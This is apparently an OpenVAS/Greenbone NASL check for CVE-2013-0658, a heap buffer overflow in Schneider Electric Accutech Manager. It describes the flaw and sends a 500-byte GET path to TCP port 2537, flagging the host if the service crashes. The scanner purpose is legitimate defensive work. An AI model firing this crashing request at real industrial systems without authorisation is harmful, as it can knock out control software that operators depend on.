if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803170" );
	script_version( "2020-07-16T07:57:13+0000" );
	script_bugtraq_id( 57651 );
	script_cve_id( "CVE-2013-0658" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-07-16 07:57:13 +0000 (Thu, 16 Jul 2020)" );
	script_tag( name: "creation_date", value: "2013-02-11 19:51:40 +0530 (Mon, 11 Feb 2013)" );
	script_name( "Schneider Electric Accutech Manager Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52034" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/24474" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/52034" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( 2537 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute
  arbitrary code or cause the application to crash, creating a denial-of-service condition." );
	script_tag( name: "affected", value: "Schneider Electric Accutech Manager version 2.00.1 and prior." );
	script_tag( name: "insight", value: "The flaw is caused by an unspecified error, which can be exploited
  to cause a heap-based buffer overflow by sending a specially crafted GET
  request with more than 260 bytes to TCP port 2537." );
	script_tag( name: "solution", value: "Upgrade to Schneider Electric Accutech Manager 2.00.4 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "The host is running Schneider Electric Accutech Manager and is
  prone to buffer overflow vulnerability." );
	exit( 0 );
}
require("http_func.inc.sc");
port = 2537;
if(!get_port_state( port )){
	exit( 0 );
}
banner = http_get_remote_headers( port: port );
if(!banner){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
req = http_get( item: NASLString( "/", crap( 500 ) ), port: port );
res = http_send_recv( port: port, data: req );
sleep( 1 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

